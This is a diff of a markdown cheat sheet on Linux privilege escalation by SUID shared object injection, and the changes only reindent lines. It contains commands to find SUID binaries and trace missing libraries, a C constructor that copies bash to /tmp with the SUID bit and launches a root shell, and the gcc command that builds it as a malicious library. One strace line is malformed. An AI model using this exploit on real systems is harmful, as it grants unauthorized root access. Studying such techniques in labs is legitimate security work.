@@ -6,17 +6,17 @@
         
    ## Resource 
    
-       https://gtfobins.github.io/
+     https://gtfobins.github.io/
        
   ## Shared Object Injection
   
-       find / -type f -perm -04000 -ls 2>/dev/null
-       strace <PATH=2>&1
+   find / -type f -perm -04000 -ls 2>/dev/null
+   strace <PATH=2>&1
        
        
   ## TYPE COMMAND 
   
-       strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+   strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
   
   
   ## OUTPUT
@@ -46,18 +46,18 @@
        
    Create C file Type Some Commands
        
-       #include <stdio.h>
-       #include <stdlib.h>
+    #include <stdio.h>
+    #include <stdlib.h>
 
-       static void inject()__attribute__((constructor));
+    static void inject()__attribute__((constructor));
 
-      void inject() {
-        system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
-      }
+    void inject() {
+      system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+    }
    
    ## Complie
 
-       gcc -shared -fpic -o /home/user/.config/libcalc.so /home/user/libcalc.c
+    gcc -shared -fpic -o /home/user/.config/libcalc.so /home/user/libcalc.c
 
 
 
